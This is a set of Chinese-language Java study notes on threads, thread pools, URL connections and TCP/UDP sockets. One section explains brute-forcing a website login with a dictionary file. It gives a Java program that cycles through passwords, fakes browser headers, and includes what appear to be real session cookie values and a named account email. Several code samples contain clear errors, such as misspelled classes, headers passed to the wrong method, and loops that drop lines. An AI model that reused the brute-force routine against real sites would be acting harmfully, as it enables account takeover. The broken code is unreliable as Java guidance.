从语法角度来看，任意对象都可以作为同步监视锁，但是从程序逻辑来看，选择“竞争资源”作为同步监视锁。如下例中的`balanceAccount`就是同步监视器。*所谓的同步监视锁，实际上就是这段代码中要监视的对象。*  

线程同步的关键在于：任意线程进入同步监视器监视的代码之前，都需要对同步监视器加锁。  
什么时候释放对同步监视器的锁？  
1. 监视的代码执行完成。  
2. 在代码中遇到了`break`或者`return`，跳出代码块。  
3. 执行代码过程中遇到了未捕获的异常。  
4. 调用同步监视器的`wait()`方法，使线程进入`wait`状态，也就是阻塞状态。如果想某一个线程在运行完之后不会死亡，而是在下次还可以运行（不用再次`start`），那么就可以对此线程使用`wait()`。使该线程进入阻塞状态，以后在别的线程中使用notify()，就可以唤醒这个阻塞的线程。

什么时候不会释放对同步监视器的锁？  
1. `sleep()`、`yield()`都不会释放。  
2. `suspend()`也不会释放。  
  
同步代码块使用示例：
>
	//The account of a person
	class Account
	{
		//the name of the person
		private String name;
		//the balanceAccount of the person
		private int account;
		Account()
		{
		}
		Account(String aName,int aAccount)
		{
			name=aName;
			account=aAccount;
		}
		public void setName(String aName)
		{
			this.name=aName;
		}
		public void setAccount(int aAccount)
		{
			this.account=aAccount;
		}
		public String getName()
		{
			return this.name;
		}
		public int getAccount()
		{
			return this.account;
		}
	}
	public class  AccoutThreadTest extends Thread
	{
		//the amount of money you want to get 
		private int drawAccount;
		//the amount of money in your account
		private Account balanceAccount;
		AccoutThreadTest(int adrawAccount,Account abalanceAccount)
		{
			this.drawAccount=adrawAccount;
			this.balanceAccount=abalanceAccount;
		}
		public void run() 
		{
			//add the concurrelock on the code block
			synchronized(balanceAccount)
			{
				if(drawAccount<=balanceAccount.getAccount())
				{
					System.out.println(Thread.currentThread().getName()+", You have got the money you want to draw: "+drawAccount);
					balanceAccount.setAccount(balanceAccount.getAccount()-drawAccount);
					System.out.println("The amount of money you left in the account is: "+balanceAccount.getAccount());
				}
				else
				{
					System.out.println(Thread.currentThread().getName()+", The amount of money in your account is not enough!");
				}
			}
		}
		//the main thread
		public static void main(String[] args) throws Exception
		{
			Account ac = new Account("wt",1000);
			new AccoutThreadTest(800,ac).start();
			new AccoutThreadTest(800,ac).start();
		}
	}

同步方法使用示例：
>
	//The account of a person
	class Account
	{
		//the name of the person
		private String name;
		//the balanceAccount of the person
		private int account;
		Account()
		{
		}
		Account(String aName,int aAccount)
		{
			name=aName;
			account=aAccount;
		}
		public void setName(String aName)
		{
			this.name=aName;
		}
		public void setAccount(int aAccount)
		{
			this.account=aAccount;
		}
		public String getName()
		{
			return this.name;
		}
		public int getAccount()
		{
			return this.account;
		}
		//the synchronized method,the this get the synchronized lock
		public synchronized void draw(int drawAccount)
		{
			if(drawAccount<=account)
				{
					System.out.println(Thread.currentThread().getName()+", You have got the money you want to draw: "+drawAccount);
					account=account-drawAccount;
					System.out.println("The amount of money you left in the account is: "+account);
				}
			else
				{
					System.out.println(Thread.currentThread().getName()+", The amount of money in your account is not enough!");
				}
		}
	}
	public class  AccoutThreadFunTest extends Thread
	{
		//the amount of money you want to get 
		private int drawAccount;
		//the amount of money in your account
		private Account balanceAccount;
		AccoutThreadFunTest(int adrawAccount,Account abalanceAccount)
		{
			this.drawAccount=adrawAccount;
			this.balanceAccount=abalanceAccount;
		}
		public void run() 
		{
			//the balanceAccount object call the synchronized method. this has the synchronized lock
			balanceAccount.draw(drawAccount);
		}
		//the main thread
		public static void main(String[] args) throws Exception
		{
			Account ac = new Account("wt",1000);
			//construct 2 different threads
			new AccoutThreadFunTest(800,ac).start();
			new AccoutThreadFunTest(800,ac).start();
		}
	}



线程的通信：同一个进程中的各个线程共享进程的内存空间。  
1. 如果不加控制，多个线程会“自由”地并发执行。  
2. 可以通过同步来解决多个线程并发访问竞争资源的问题。同步会导致效率线程降低，也就是前面所言的线程安全的类会导致效率降低。前面所言的线程安全的类适合于多线程的环境，线程不安全的类适合于单线程环境。  
3. 如果希望各线程之间能更有序地执行。如，生产者-消费者问题，我们希望消费者每次消费的时候都有资源可供消费。这就要求生产者线程与消费者线程之间能够互通消息，才能保证线程之间能够协调有序进行。这就涉及到线程通信的问题。
这里使用到了`Object`类的几个方法：`wait()`--控制线程暂停，会释放对同步监视器的锁，直到收到唤醒通知、`notify()`--发送唤醒通知，唤醒处于`wait`状态的线程、`notifyAll()`--发送唤醒通知，唤醒处于`wait`状态的线程。  
但是并不是所有的对象都可以调用者三个方法。只有**同步监视器**才能调用者三个方法。
如果不使用wait()，就会导致本线程运行完后立刻结束了，线程不会再启动了。也就是说整个线程都结束死亡了，如果不想这个线程在执行这一次之后就死亡，而是想让这个线程此次运行完之后不会死亡，以后还可以不用start就可以运行，那么就要使用wait()，然后在其他线程中使用notify()之后，就会唤醒处于wait状态的线程。这样，就能保证线程在我们可控的顺序下运行。

线程通信使用示例：
>
	//The account of a person
	class Account
	{
		//the name of the person
		private String name;
		//the balanceAccount of the person
		private int account;
		public boolean hasdeposted=false;
		Account()
		{
		}
		Account(String aName,int aAccount)
		{
			name=aName;
			account=aAccount;
		}
		public void setName(String aName)
		{
			this.name=aName;
		}
		public void setDeposit(boolean b)
		{
			this.hasdeposted=b;
		}
		public void setAccount(int aAccount)
		{
			this.account=aAccount;
		}
		public String getName()
		{
			return this.name;
		}
		public int getAccount()
		{
			return this.account;
		}
	}
	class drawThread extends Thread
	{
		//the amount of money you want to get 
		private int drawAccount;
		//the amount of money in your account
		private Account balanceAccount;
		drawThread(int adrawAccount,Account abalanceAccount)
		{
			this.drawAccount=adrawAccount;
			this.balanceAccount=abalanceAccount;
		}
		public void run() 	
		{
			try
			{
				int i;
				//add the concurrelock on the code block
				synchronized(balanceAccount)
				{
					for(i=0;i<100;)
					{
					if(balanceAccount.hasdeposted==true)
					{
						if(drawAccount<=balanceAccount.getAccount())
						{
							System.out.println(Thread.currentThread().getName()+", You have got the money you want to draw: "+drawAccount);
							balanceAccount.setAccount(balanceAccount.getAccount()-drawAccount);
							System.out.println("The amount of money you left in the account is: "+balanceAccount.getAccount());
							System.out.println(i);
							i++;
						}
						else
						{
							System.out.println(Thread.currentThread().getName()+", The amount of money in your account is not enough!");
						}
						//set the flag value
						balanceAccount.setDeposit(false);
						//notify all the other values
						balanceAccount.notifyAll();
					}
					else
					{
						balanceAccount.wait();
					}
					}
				}
			}
			catch(Exception e)
			{
				System.out.println("error");
			}
		}
	}	
	class  depositThread extends Thread
	{
		//the amount of money you want to get 
		private int depositAccount;
		//the amount of money in your account
		private Account balanceAccount;
		depositThread(int adepositAccount,Account abalanceAccount)
		{
			this.depositAccount=adepositAccount;
			this.balanceAccount=abalanceAccount;
		}
		public void run() 
		{
			int j;
			//add the concurrelock on the code block
			try
			{
				synchronized(balanceAccount)
				{
					for(j=0;j<100;)
					{
					if(balanceAccount.hasdeposted==false)
					{
						System.out.println(Thread.currentThread().getName()+", You have deposit the money you want to : "+depositAccount);
						balanceAccount.setAccount(balanceAccount.getAccount()+depositAccount);
						System.out.println("The amount of money you left in the account is: "+balanceAccount.getAccount());
						System.out.println(j);
						//set the flag value
						balanceAccount.setDeposit(true);
						//notifyAll all the other threads
						balanceAccount.notifyAll();
						j++;
					}
					else
					{
						balanceAccount.wait();
					}
					}
				}
			}
			catch(Exception e)
			{
				System.out.println("error");
			}
		}
	}
>	
	public class ThreadCommuniTest
	{
		//the main thread
		public static void main(String[] args) throws Exception
		{
			Account ac = new Account("wt",1000);
			new depositThread(800,ac).start();
			new drawThread(800,ac).start();
		}
	}


线程组与未处理的异常
`Java`中用一个类`ThreadGroup`表示线程组。  
怎样将线程方法放入指定的线程组中？在构造线程对象的时候在构造器中设置器所在的线程组。  
将线程放入线程组之后，就能够对线程组中的线程进行整体的管理。  
线程组里面还可以包含线程组。
使用线程组的时候，需要实现`Runnable`接口或者`Callable`接口，而不要去继承`Thread`类。这样方便与将线程加入线程组。  
线程组对其内的线程的控制：  
1. setDaemon():将这个线程组设置为后台线程组，但并不是将其内的线程设为后台线程。后台线程组的作用在于：当后台线程组里面所有的线程都死亡了，那么这个后台线程组本身也会自动销毁。否则要销毁后台线程组只能调用其destory()方法。  
2. setPriority()：设置线程组的优先级，表示线程组里面的线程的优先级不会超过线程组的优先级。但是这只会限制在设置线程组优先级之后加入的线程的优先级，对于设置线程组优先级之前的线程是没有影响的。  
3. 用于线程异常处理的方法：*在JDK1.5以前*，如果线程出现了异常，系统会自动回调它所在的线程组的uncaughtException()方法来修复异常。也就是说，让线程组帮助线程处理异常。*在JDK1.5以后*，可以由线程自己设置异常处理器(本线程类或者类对象调用给异常处理方法即可），无需线程组帮忙处理了。

线程异常处理的三种方法，由于任何一个线程所要运行的代码都放在该线程的run()方法内部，所以如果要在run()方法外处理异常，就需要run()方法throws Exception，然而，由于run()方法是重写而来，原来的run()方法是没有throws Exception的，所以重写之后也不能throws Exception。因此，我们就需要使用其他的方式而不是依靠run()方法throw来处理异常。所以在Thread类和ThreadGroup类中都有专门的异常处理方法。

线程异常处理方法：  
方法1：使用`ThreadGroup`类的处理方法进行处理
>
	public class ThreadGroupExceptionTest implements Runnable
	{
		public void run()
		{	
			for(int i=0;i<100;i++)
			{
				System.out.println(100/(i-20));
			}
		}
		public static void main(String[] args) 
		{
			ThreadGroup tg = new ThreadGroup("tg1"){
				//set the thread exception dealer func
				//the threadgroup deal the exception for the thread
				public void uncaughtException(Thread t, Throwable e) 
				{
					System.out.println("The Error occure in the thread: "+t.currentThread().getName()+e.getMessage());
				}
			};
>			
			ThreadGroupExceptionTest tgt = new ThreadGroupExceptionTest();
			//construct the thread, add it to the threadgroup
			Thread t = new Thread(tg,tgt);
			t.start();
>			
			//construct the thread, add it to the threadgroup
			Thread t1 = new Thread(tg,tgt);
			t1.start();
>			
			//calculate the num of the thread in the threadgroup
			System.out.println(tg.activeCount());
>			
			//the threadgroup with dealing fun an deal with the exception came out of the threads in the threadgroup but not the thread came out of the threadgroup
			System.out.println(20/0);
		}
	}



方法2:使用`Thread`类的处理方法,各个`Thread`对各自的`Thread Exception`进行处理
>
	public class ThreadExceptionTest implements Runnable
	{
		public void run()
		{	
			for(int i=0;i<100;i++)
			{
				System.out.println(100/(i-20));
			}
		}
		public static void main(String[] args) 
		{
			ThreadExceptionTest tgt = new ThreadExceptionTest();
>			
			Thread t = new Thread(tgt);
			//set the exception dealer func 
			// the thread itself but not the threadgroup deal with its own but not all the exceptions for the thread
			t.setUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler(){
				public void uncaughtException(Thread t, Throwable e) 
				{
					System.out.println("The Error occure in the thread: "+t.currentThread().getName()+e.getMessage());
				}
			}); 
			t.start();
>			
			Thread t1 = new Thread(tgt);
			//set the exception dealer func 
			// the thread itself but not the threadgroup deal with its own but not all the exceptions for the thread
			t1.setUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler(){
				public void uncaughtException(Thread t, Throwable e) 
				{
					System.out.println("The Error occure in the thread: "+t.currentThread().getName()+e.getMessage());
				}
			}); 
			t1.start();
>			
			//the thread dealing fun can also deal the exception came out of the main thread
			Thread.currentThread().setUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler(){
				public void uncaughtException(Thread t, Throwable e) 
				{
					System.out.println("The Error occure in the thread: "+t.currentThread().getName()+e.getMessage());
				}
			}); 
			System.out.println(20/0);
		}
	}


方法3：使用`Thread`类的`static`处理方法,对所有`Thread`出现的`Thread Exception`进行处理
>
	public class ThreadDefaultExceptionTest implements Runnable
	{
		public void run()
		{	
			for(int i=0;i<100;i++)
			{
				System.out.println(100/(i-20));
			}
		}
		public static void main(String[] args) 
		{
			//set the exception dealer func 
			// the thread itself but not the threadgroup deal with all the exceptions for the threads
			Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler(){			
				public void uncaughtException(Thread t, Throwable e) 
				{
					System.out.println("The Error occure in the thread: "+t.currentThread().getName()+e.getMessage());
				}
			}); 
>			
			ThreadDefaultExceptionTest tgt = new ThreadDefaultExceptionTest();
			Thread t = new Thread(tgt);
			t.start();
>			
			Thread t1 = new Thread(tgt);
			t1.start();
>			
			//the thread dealing fun can also deal the exception came out of the main thread
			System.out.println(20/0);
		}
	}


线程池（`Pool`）  
池的本质，就是一种“缓存”技术。当某些东西创建的时候需要很大代价的时候，用完它不会立刻扔到，而是留下来，供以后使用。是否要缓存一个东西的决定点在于这个东西的创建成本，也要考虑系统的内存。  
缓存的本质是：以牺牲空间换时间。  
线程的创建成本比较大。虽然创建线程的成本比创建进程的成本小的多，但相比于普通的Java``对象，`Thread`对象的创建成本依然较大。  
为解决此问题，我们需要使用线程池。  
`JDK1.5`之后，提供了良好的线程池支持，依靠`Executors`类以实现线程池。这个类是创建线程池和线程工厂的工具类。 `ExecutorService`就是线程池类。`ScheduledExecutorService`也是线程池，其是`ExecutorService`的子接口，功能比`ExecutorService`强（可以周期性调用某一个线程）。  

线程池使用步骤：  
1. 使用`Executors`静态工厂工具类创建线程池对象(`ExecutorService`对象或者`ScheduledExecutorService`对象)。线程池对象里面放的是空闲的线程资源。  
2. 调用`ExecutorService`对象或者`ScheduledExecutorService`对象的方法来提交我们自己的线程(使用`submit()`方法或者`scheduleAtFixedRate()`方法)。线程提交之后并不会立即被启动，而是取决于线程池中是否有空闲的线程资源。  
3. 线程池没有结束，本程序就不会结束。要调用`shutdown()`方法结束线程池。  

注意这里的`ScheduledExecutorService`线程池可以让某一个线程每隔一定的时间就运行一次，这是一个周期性的运行，这一点可以运用到许多的事儿上。则个线程池的周期性事件的方法是`scheduleAtFixedRate()`方法。
而且使用线程池更简单。
 
工具类：`Arrays`、`Objects`、`Collections`、`Paths`、`Files`、`Executers`。  



怎样开不同的线程，各个线程中做不同的事？  
1. 只写一个线程类，一个线程类中只能有一个`run()`方法，然后用这一个线程类创建多个不同的线程，调用`start()`方法，其中的`run()`方法中进行判断，针对不同的线程执行不同的代码即可。  
2. 做几个不同的事就写几个线程类，每个线程类都有自己的`run()`方法，各个`run()`方法里就是各个线程要做的事。然后对各个线程类建立自己的对象，对各个对象调用`start()`方法。


匿名内部类可用于：  
1. 创建接口变量所引用的对象。  
2. 创建抽象类变量所引用的对象。  
3. 创建任何一个类变量所引用的其子类对象，即使没有写出它的子类的名字，这也就是匿名内部类的特点，父类的子类、接口的实现类、抽象类的实现类等都没有类名，而是直接创建了这些类的类对象。






Java中的网络
-------------
网络已经不再是简单的通信工具，计算机已经成为网络的一部分，网络即是计算机。这个就是云计算的概念。  
移动互联网：所有的移动终端、PC端都可以通过有线、无线方式接入到互联网，扩充互联网的概念。  
物联网：要求家里的所有电器都不再是单纯的电器。它们都具有操作系统，都需要连入互联网。这种模式让互联网模式更为扩大。使所有电器都能通过网络控制。


OSI分层：是一种非常理论化的分层，分为7层，是一个理论上的东西。  
TCP/IP分层：实际上上使用的分层。分为4层。  
物理层+数据链路层：用于传输最底层二进制。  
网络层：IP协议(Internet Protocal)，复制为网络上的节点分配唯一标识。  
传输层：TCP协议，实际上TCP协议与IP协议被一起设计出来，经常被放在一起提出。  
应用层:HTTP协议、FTP协议、SMATP协议、POP3协议，应用层的各个协议都用于不同的应用功能。


IP地址：IP地址可以是一台PC机、一台打印机、路由器上的某一个接口。作用：为网络上的每个物理节点(广义上)分配一个门牌号。通过IP地址可以保证网络数据包能正确地找到物理节点。IPV4(32位,只有40亿个地址)与IPV6(128位，地址无数).

关于IPV4，由于总共全世界直邮40亿个IPV4地址，所以导致地址不够，这样，可能整个小区或者整个学校的校园网只有几个IP地址，这个范围内的所以机器都属于这个子网共享这几个IP地址，各机器通过子网掩码进行区分。也就是说，整个学校的机器的IP地址都是一样的，但是每一个机器的子网掩码是不同的，这样在传输数据的时候，会先通过IP地址到达本校，然后通过子网掩码在本子网的范围内找到我们要的机器。也就是说，将IP地址与子网掩码配合起来使用。  
同时，由于IPV4地址不够用，就产生了一个动态IP，对于有些机器，当其在不使用的时候，就将其IP地址分配给其他机器使用，下次使用的时候重新分配。导致这个机器的IP地址是不固定的，处于动态变化。这样的动态IP就会导致一定的问题，对于有些机器，如果IP地址改变以后就不再能被找到了。所以出现了IPV6地址，这样可以提供更多的IP地址。

端口：对于一台机器，上面有多个应用程序在运行，每个程序在接收数据的时候，数据可以通过IP地址与子网掩码找到目的主机。但是难以找到这个主机上的目的应用程序，这样就需要端口，为每个应用程序提供接口，端口相当于这个栋楼上的某个房间号。IP地址相当于这栋楼的门牌号。  
端口的约定：0~65535个。  
其中0~1023：公用端口，我们就不要去使用了。80(HTTP)21(FTP)、110(POP)。  
1023~49151：公用程序端口。MySQL(3306),Oracle(1521)。  
49152~65535：动态分配的端口，不是给应用程序使用的。


InetAddress:该类代表标准IP地址，不带端口。其有两个子类，一个代表IPV6，一个代表IPV4。  
InetSocketAddress：机器上的程序的地址，包括IP地址+端口号。  

InetAddress使用：通过该类的各种方法获得这个类对象所代表的IP地址的各种属性。

InetAddress类使用示例：
>
	import java.net.*;
	public class InetAddressTest
	{
		public static void main(String[] args)  throws Exception
		{
			//this InetAddress is an address class,it represents an IP address.
			//this class provades several methods to test the IP Address features.
			InetAddress iaddr = InetAddress.getByAddress(new byte[]{(byte)218,59,(byte)186,75});
			//get the host name of this IP address
			System.out.println(iaddr.getHostName()); 
			//test the ip address is reachable, just like the cmd line: ping
			System.out.println(iaddr.isReachable(5000)); 
		}
	}


网络编程里面的两个常用工具类：  
URLDecoder与URLEncoder类：用于对字符串进行编码与解码。  
URLEncoder类：可以将所有“非西欧文字”编码成"%B7%E8"这样的格式。这种转换的作用是：在某些场景下，是无法传输与储存"非西欧文字"的，此时就需要使用URLEncoder这个类将"非西欧文字"(例如：中文字符)编码成西欧文字格式，再进行传输与储存。例如，Cookie的值就不能是中文。另，注意，这个转换只能转换“非西欧文字”，如果字符串中有英文，那么其中的英文是不会被转换的，而是保持原样。  
URLDecoder：可以把被URLEncoder编码后的文字转换为原来的文字。

URLEncode类与URLDecode类使用示例：
>
	import java.net.*;
	public class EncodeTest
	{
		public static void main(String[] args)  throws Exception
		{
			encode the string in sepecific charset
			String enStr = URLEncoder.encode("你好","GBK");
			System.out.println(enStr);
			String deStr = URLDecoder.decode(enStr,"GBK");
			System.out.println(deStr);
		}
	}




网络地址：包括协议+IP地址+端口+要访问的文件名。  
网络地址实际上代表的就是主机服务器上的某个文件的路径与地址。客户端可以通过一个服务器上的文件的URL向这个服务器请求这个文件。服务器发送了这个文件之后，客户端再解析这个文件，显示文件内容。
URL：代表一个网络地址。  
URLConnection：代表一个网络地址连接。  
HttpURLConnection：代表一个基于Http的网络地址连接。  

1. 使用URL类的方法获得这个这个URL地址的特性。  
还可以使用openStream()方法获得与这个服务器端存放的文件的连接在一起的InputStream流对象。然后通过这个输出流对象将这个文件传输过了，也就是下载到本地，实际上这就是爬虫爬网页的操作。  
2. 另外可以通过openConnection()方法获得一个URLConnection对象，实际上就是建立与远程URL之间的连接。再通过这个URLConnection的getInputStream()方法等获得这个文件。注：在使用Http协议的时候，使用openConnection()方法获得一个URLConnection对象实际上就是HttpURLConnection连接。HttpURLConnection类是URLConnection类的子类。  
当获得了HttpURLConnection连接之后，可以模仿浏览器提交请求，模仿浏览器获取服务器的响应。


URL类使用示例：
>
	import java.net.*;
	import java.io.*;
	public class URLTest
	{
		public static void main(String[] args)  throws Exception
		{
			//URL means the name and path of the file in the host server 
			URL u = new URL("http://www.sohu.com/");
			System.out.println(u);
			System.out.println(u.getProtocol());
			System.out.println(u.getFile());
			System.out.println(u.getHost());  
>			
			InputStream is = u.openStream();
			BufferedReader br = new BufferedReader(new InputStreamReader(is));
			while(br.readLine()!=null)
			{
				System.out.println(br.readLine());
			}
		}
	}  


`URLConnection`类使用示例：
>
	import java.net.*;
	import java.io.*;
	public class URLConnectionTest
	{
		public static void main(String[] args)  throws Exception
		{
			//URL means the name and path of the file in the host server 
			URL u = new URL("http://www.sohu.com/");
			//get the urlconnection, it is the conection between local machine and host server
			URLConnection uc = u.openConnection();
>			
			System.out.println(uc); 
			InputStream is = uc.getInputStream();
			BufferedReader br = new BufferedReader(new InputStreamReader(is));
			while(br.readLine()!=null)
			{
				System.out.println(br.readLine());
			}
		}
	}

`HttpURLConnection`类使用示例：
>
	import java.net.*;
	import java.io.*;
	public class HttpURLConnectionTest
	{
		public static void main(String[] args)  throws Exception
		{
			//URL means the name and path of the file in the host server 
			URL u = new URL("http://money.163.com/");
			//get the urlconnection, it is the conection between local machine and host server
			URLConnection uc = u.openConnection();
			//transform the URLConnection to HttpURLConnection,HttpURLConnection is the subClass of URLConnection.
			HttpURLConnection huc = (HttpURLConnection)uc;
			
			huc.connect();
			InputStream is = uc.getInputStream();
			BufferedReader br = new BufferedRe ader(new InputStreamReader(is));
			while(br.readLine()!=null)
			{
				System.out.println(br.readLine());
			}
		}
	}

网站登录密码破解：使用字典文件进行暴力破解。  
字典：一个文档，里面存放的是各种字符的组合，也就是有很多的字符串，在暴力破解的时候，用字典里的字符组合去依次进行输入试探，以达破解密码的目的。  

网站破解步骤：  
1. 建立`HttpURLConnection`连接。
2. 修改设置登陆页面的`Request`特性，使用`setRequestProperty()`方法设置我们自己的的请求特性(`RequestProperty`)，假装后面的请求来自正规浏览器。  
3. 设置输入、输出都为`true`。
4. 从字典文件中读取字符串。  
5. 将字符串发送到远程服务器中的登陆页面。  
6. 接收远程服务器返回的数据，查找返回数据中是否有“登陆成功”这样的字样，如果有，那么就是正确的密码。  
7. 2~6步骤进行循环，每读取一次密码组合都设置一次`Request`特性，发送一次数据，接收一次数据，比对一次收到的数据。


网站登录密码暴力破解使用示例（不完全版）：
>
	import java.net.*;
	import java.io.*;
	public class WebsitCrackTest
	{
		public static void main(String[] args)  throws Exception
		{
			//建立一个HttpURLConnection连接
			//URL means the name and path of the file in the host server 
			URL u = new URL("http://money.163.com/");
			//get the urlconnection, it is the conection between local machine and host server
			URLConnection uc = u.openConnection();
			//transform the URLConnection to HttpURLConnection,HttpURLConnection is the subClass of URLConnection.
			HttpURLConnection huc = (HttpURLConnection)uc;
>			
			//读取字典文件
			BufferedReader br = new BufferedReader(new FileInputStream(new File("dic.txt")));
			String passwd = null;
			try
			{
				while((passwd=br.readLine())!=null)
				{
					//设置请求特性，假装成一个浏览器的请求特性
					huc.setRequestMethod("Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
					huc.setRequestMethod("Accept-Encoding:gzip,deflate,sdch");
					huc.setRequestMethod("Accept-Language:en,zh-CN;q=0.8,zh;q=0.6,en-US;q=0.4");
					huc.setRequestMethod("Cache-Control:max-age=0");
					huc.setRequestMethod("Connection:keep-alive");
>					
					huc.setRequestMethod("Cookie:SINAGLOBAL=8825319064781.07.1403880617735; UUG=usr1024; UV5=usrmdins31284; _s_tentry=login.sina.com.cn; Apache=7425474273040.891.1404887269139; ULV=1404887269196:157:111:48:7425474273040.891.1404887269139:1404886212734; myuid=1702227501; SUB=AQPtL6KmQfJpO1wjc%2BSyogVaZLhQn4kx6f0LHxjRCB9dq1GHJxPch7QumasQfwBm5tOXmbo1e%2FljSjLyg4Ho1B%2BZRYZuyJh%2FbzgoGTrg6WBBoscISzrrpMd5AumRrEa%2Bo16ZCeavsKNzZFdyz%2B4PK2nhu6m9VizCZJKfY2e8dKZu; SUBP=002A2c-gVlwEm1dAWxfgXELuuu1xVxBxAuLIWhDMeo9gyfNEJVgSOxiuHYqW8lZpXYODHSZDM0oC_emc1AopXivJHcsb0%3D%3D; login_sid_t=0a52bcf3e3ea1e6ad50be59e449ff192; UOR=passport.weibo.com,weibo.com,login.sina.com.cn");
>					
					huc.setRequestMethod("Host:weibo.com");
					huc.setRequestMethod("If-Modified-Since:Wed, 09 Jul 2014 06:36:10 GMT");
>					
					huc.setRequestMethod("Referer:http://login.sina.com.cn/sso/logout.php?entry=miniblog&r=http%3A%2F%2Fweibo.com%2Flogout.php%3Fbackurl%3D%252F");
>					
					huc.setDoOutput(true);
					huc.setDoInput(true);
					huc.connect();
>					
					//打开本机的输出流，也就是远程主机的输入流,向远程主机发送数据
					PrintScream ps = new PrintStream(huc.getOutputScream());
					ps.print("username =trileverwt31204@sina.com&passwd = " +passwd);
					ps.flush();
>					
					BufferedReader br1 = new BufferedReader(new inputStreamReader(huc.getInputStream()));
					string line = null;
					while((line=br1.readLine())!=null)
					{
						if(line.contains("登陆成功"))
						{
							System.out.println("the correct passwd is : "+ line);
						}
					}
				}
			}
			catch(Exception e)
			{
				System.out.println("Error");
			}
		}
	}

`TCP`通信

`TCP`协议：如果两台计算机需要连接，那么`TCP`协议就会让他们之间建立一个连接：用于发送与接收数据的虚拟链路。见`TCP`协议图。  
实际上这条链路两端连接的东西叫：`socket`，**相当于一个插座**。客户端程序和主机端程序都是建立在`socket`之上的。在客户端，通过`TCP`协议将程序发出的信息包转换、排列、发送出去(通过`socket`)；在主机端，在`socket`收到了数据之后，也通过`TCP`协议将`socket`收到的数据转换恢复过来。也叫套接字。实际上就是**插座**的意思。   
`TCP`协议负责收集这些信息包，并将它们按适当的次序排好、通过下面的`socket`发送。在接收端的`socket`收到数据之后再通过`TCP`协议将其正确还原。  
`TCP`协议保证了数据包在传送过程中准确无误。其使用重发机制：也就是收信者接收到消息之后，需要发送确认信息。否则发送者会重复发送刚才发送的信息。通过这种机制，`TCP`协议为应用程序提供了可靠的通信连接。使其能够适应网络环境的各种变化。保证通信的可靠。
 
`TCP`通信的关键：  
1. `socket`--相当于“虚拟链路”两端的插座，其负责完成通信。  
2. `ServerSocket`--其只负责“接受”连接，用于产生`socket`。  

所以为了实现客户端与服务端的通信，两端都要有`socket`，也就是需要两个`socket`。步骤如下：  
1. 在服务器端  
a. 创建`ServerSocket`对象，但是注意，`ServerSocket`本身并不是`socket`，其不能用来通信，而是用于监听的。  
b. `ServerSocket`对象处于服务器端，该对象调用`accept()`方法后，就会一直等待，监听客户端是否发送请求。当监听到客户端的请求之后，该方法就会返回一个`socket`对象，否则就会一直处于等待状态（`accept`方法会阻塞线程）。这个就是客户端的`socket`对象，用于通信。  
创建`ServerSocket`时，使用端口有规定。  
c. 通过`I/O`流(`BufferedReader`)读取客户端发送过来的数据，也可以通过`I/O`流(使用`PrintStream`)向客户端发送数据。  
2. 在客户端  
a. 直接创建`socket`对象，参数有`IP`地址与程序端口号，`IP`地址是服务器主机的`IP`地址，程序端口号就是服务器端程序所使用的端口号。  
b. 通过`I/O`流(使用`PrintStream`)向服务器段发送数据，也可以通过`I/O`流(`BufferedReader`)从服务器端接收数据。

数据传输`socket`使用示例：  
`ClientSocket`：  
>  
	import java.net.*;
	import java.io.*;
	public class ClientSocketTest
	{
		public static void main(String[] args) 	throws Exception
		{
				try
				{
					//construct an InetAddress object
					 InetAddress iad = InetAddress.getByAddress(new byte[]{10,23,94,(byte)225});
					//connect to the server
					Socket s = new Socket(iad,30000);
>					
					//no matter when and where to output, you'd better transform the OutputStream into the PrintStream object.
					//no matter when and where to input, you'd better transform the InputStream into the BufferedReader object.
>					
					//read from the inputstream which came from the server socket.
					InputStreamReader isr = new InputStreamReader(s.getInputStream());
					BufferedReader br = new BufferedReader(isr);
					System.out.println(br.readLine());
>					
					//write into the printStream which link to the server socket
					PrintStream ps = new PrintStream(s.getOutputStream());
					ps.println("hello");
				}
				catch(Exception e)
				{
					System.out.println("error");
				}
			}	
	}


`ServerSocket`:  
>
	import java.net.*;
	import java.io.*;
	public class ServerSocketTest
	{
		public static void main(String[] args) throws Exception
			{
				ServerSocket ssc = new ServerSocket(30000); 
				System.out.println("Waiting for connections......");
				Socket sk = ssc.accept();
>				
				//no matter when and where to output, you'd better transform the OutputStream into the PrintStream object.
				//no matter when and where to input, you'd better transform the InputStream into the BufferedReader object.
>				
				//write into the printStream which link to the client socket
				PrintStream ps = new PrintStream(sk.getOutputStream());
				ps.println("hi");
>				
				//read from the inputstream which came from the client socket.
				InputStreamReader isr = new InputStreamReader(sk.getInputStream());
				BufferedReader br = new BufferedReader(isr);
				System.out.println(br.readLine());
			}	
	}


注：使用ipconfig可以查询本机IP地址，在子网中，查询的就是本机IP。如果是在公网中，那么就有自己独立的IP地址，而不是与人共用的IP地址。
在ip138上查询的是公网IP，也就是分配给学校的IP地址，公网IP地址整个学校也只有那么几个。公网IP和本机的子网掩码一起进行计算得到的就是处于子网中的本机IP地址，这个本机IP地址就是通过ipconfig命令查询而来的IP地址。

关于输入输出：  
输出时最好都转化成PrintStream进行输出(将OutputStream转化为PrintStream)，因为更方便。  
输入时最好都转化为BufferedReader进行输入(将InputStream转化为BufferedReader)，因为这样最方便。  
以上两条就是输入、输出（无论是网络还是磁盘）的最好的方法。


`UDP`协议通信  
`UDP`协议无需建立虚拟链路，其传输是不可靠的。  
A节点以DatagramSocket发送数据报(类似与集装箱)，数据报携带数据，数据报上有目标地址，大部分情况下，数据报会抵达目标地址。  
在某些时候，数据报会丢失——丢失了也不管。  
UDP协议可能出现的情况：先发送的信息，反而后抵达目的。  

常用的类：`DatagramSocket`与`DatagramPacket`。
`DatagramSocket`：相当于“码头”，用于发送、接收数据报（也就是数据集装箱）。  
`DatagramPacket`：相当于“数据集装箱”，也就是数据报。其作用是将数据装在一起。    
客户端一般不指定端口，因为不知道所需端口是否已经被占用。  
发送端：  
1. 先创建码头`(DatagramSocket`)。无需固定IP。  
2. 创建有数据、有目标地址(接收端服务器的IP地址与端口)的数据报。  
3. 发送

接收端：  
1. 创建有固定IP、固定端口的码头(`DatagramSocket`)。  
2. 创建空的数据报。  
3. 接收。
 
注意：在接收端接收到数据报之后，就可以从这个数据报中找到该数据报等待发送者的IP地址与端口。从而可以用这个IP地址向发送者返回数据报。  

UDP协议通讯与TCP协议通信的区别在于：  
TCP协议通信时，需要使用I/O来发送与读取数据。  
UDP协议通信时，不需要使用I/O来发送与读取数据。  

